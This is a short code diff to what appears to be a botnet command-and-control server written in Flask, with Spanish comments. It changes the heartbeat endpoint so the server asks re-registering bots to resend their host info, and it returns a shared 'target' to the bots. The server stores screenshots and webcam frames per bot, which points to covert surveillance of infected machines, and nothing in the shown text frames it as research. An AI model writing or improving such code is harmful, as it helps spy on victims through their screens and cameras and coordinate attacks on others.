@@ -49,10 +49,21 @@ def heartbeat():
     global current_target
     data = request.json
     bot_id = data.get("bot_id", "unknown")
-    if bot_id not in bots:
+    
+    # Verificamos si ya conocemos a este bot y si tenemos su info
+    is_new = bot_id not in bots
+    if is_new:
         bots[bot_id] = {"info": {}, "screenshots": [], "cam_frames": []}
+    
+    # Si el bot existe pero no tiene info (por un reinicio), pedimos que la mande
+    needs_info = is_new or not bots[bot_id]["info"]
+    
     bots[bot_id]["last_seen"] = datetime.now().strftime("%H:%M:%S")
-    return jsonify({"status": "alive", "target": current_target}), 200
+    return jsonify({
+        "status": "alive", 
+        "target": current_target,
+        "needs_info": needs_info
+    }), 200
 
 @app.route('/')
 def index():
